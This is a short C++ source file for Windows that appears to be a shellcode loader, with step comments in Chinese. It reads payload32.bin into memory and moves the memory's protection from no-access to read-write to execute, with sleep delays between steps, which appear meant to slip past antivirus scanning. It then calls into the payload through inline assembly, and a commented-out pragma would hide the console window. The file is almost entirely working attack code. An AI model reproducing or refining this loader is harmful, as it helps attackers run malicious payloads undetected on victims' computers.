/*
sleep 3s+3s
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>

using namespace std;

#pragma comment(linker, "/section:.data,RWE") 
//隐藏控制台窗口
//#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
//#pragma comment(linker, "/INCREMENTAL:NO") 

//EXTERN_C VOID CallProc(LPVOID);

int main()
{
	//打开要执行的ShellCode文件	
	HANDLE hFile = CreateFileA(".\\payload32.bin", GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("CreateFile Error");
		return -1;
	}
	cout << &hFile << endl;
	DWORD dwSize = 0;
	//获取ShellCode的总大小
	dwSize = GetFileSize(hFile, NULL);
	cout << dwSize << endl;
	//申请一块可读可写可执行的内存
	LPVOID lpAddress = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_NOACCESS);
	if (lpAddress == NULL)
	{
		printf("VirtualAlloc Error");
		CloseHandle(hFile);
		return -1;
	}
	Sleep(1000);
	//将文件读取到申请的内存中
	DWORD dwRead = 0, dw;
	printf("lpAdress:%x ", lpAddress);
	Sleep(3000);
	VirtualProtect(lpAddress, dwSize, PAGE_READWRITE, &dw);
	BOOL RES = ReadFile(hFile, lpAddress, dwSize, &dwRead, 0);

	//执行ShellCode
	Sleep(3000);
	VirtualProtect(lpAddress, dwSize, PAGE_EXECUTE, &dw);
	__asm
	{
		call lpAddress;
	}
	//CallProc(lpAddress);
	
	return 0;
}
